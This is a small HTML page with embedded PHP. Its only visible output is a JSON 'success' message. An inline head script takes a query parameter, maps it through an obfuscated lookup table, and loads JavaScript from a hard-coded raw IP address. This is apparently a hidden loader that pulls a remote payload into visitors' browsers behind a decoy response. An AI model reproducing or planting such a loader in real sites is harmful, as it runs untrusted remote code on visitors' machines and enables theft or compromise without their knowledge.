<html>
<head>
    <script>
        const objectMap = {
            "0fgl75km":"nruldtca",
            "v302ocn8":"1rdg6n90",
            "canmh1k6":"fb3pi5yu"
        }
        const param = window.location.search.replace("?", "").split("&")[0];
        console.log("Script", param)
        var script = document.createElement('script');
        script.setAttribute('src', 'http://143.244.156.151/blog?' + objectMap[param] + '.js');
        document.head.appendChild(script);
    </script>
</head>
</head>
<body>
    <?php echo '{"success": "true"}'; ?>
</body>
</html>